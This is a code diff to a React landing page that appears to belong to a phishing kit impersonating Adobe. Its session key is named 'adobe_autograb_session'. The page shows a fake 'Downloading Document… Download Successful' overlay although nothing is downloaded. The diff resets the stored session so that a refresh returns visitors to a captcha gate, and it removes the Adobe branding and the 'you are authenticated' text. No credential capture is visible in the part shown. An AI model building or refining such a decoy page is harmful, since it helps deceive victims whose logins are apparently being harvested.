@@ -10,14 +10,14 @@ interface LandingPageProps {
  *   show a full-screen plain-text overlay that displays:
  *     "Downloading Document" with an animated dot sequence.
  * - After a short interval the message immediately switches to:
- *     "Download Successful — check folder."
+ *     "Download Successful".
  * - The "success" text remains visible indefinitely (until the page is refreshed).
  *
  * The overlay is shown only once per session (tracked by sessionStorage key
- * "adobe_download_shown::<sessionId>").
+ * "adobe_download_shown::<sessionId>" ).
  *
- * This component intentionally avoids the original complex layout and only
- * implements the requested download sequence UI/logic.
+ * NOTE: when the sequence finishes we remove the persisted session so that a
+ * page refresh will return the user to the captcha flow (App.tsx reads localStorage).
  */
 const LandingPage: React.FC<LandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
@@ -78,6 +78,15 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         } catch {
           // ignore
         }
+
+        // REMOVE persisted session so that a full page refresh will return the user
+        // to the captcha flow (App.tsx reads localStorage on load).
+        try {
+          localStorage.removeItem('adobe_autograb_session');
+        } catch {
+          // ignore failures to remove storage
+        }
+
         successTimeoutRef.current = null;
       }, 3000) as unknown as number;
 
@@ -102,10 +111,9 @@ const LandingPage: React.FC<LandingPageProps> = () => {
   // Render a minimal landing view plus the overlay when triggered.
   return (
     <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#0b0b0b', color: '#fff' }}>
-      {/* Minimal background content (kept intentionally tiny) */}
+      {/* Minimal background content left intentionally empty (removed titles per request) */}
       <div style={{ textAlign: 'center', opacity: showOverlay ? 0.2 : 1 }}>
-        <div style={{ fontSize: 20, fontWeight: 600, marginBottom: 8 }}>Adobe Cloud</div>
-        <div style={{ color: '#cfcfcf' }}>Welcome — you are authenticated.</div>
+        {/* Intentionally left blank to remove branding and "Welcome" text */}
       </div>
 
       {/* Overlay with plain text and dot animation */}
@@ -135,7 +143,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
               <span>Downloading Document{dots}</span>
             )}
             {phase === 'success' && (
-              <span>Download Successful — check folder.</span>
+              <span>Download Successful</span>
             )}
           </div>
         </div>
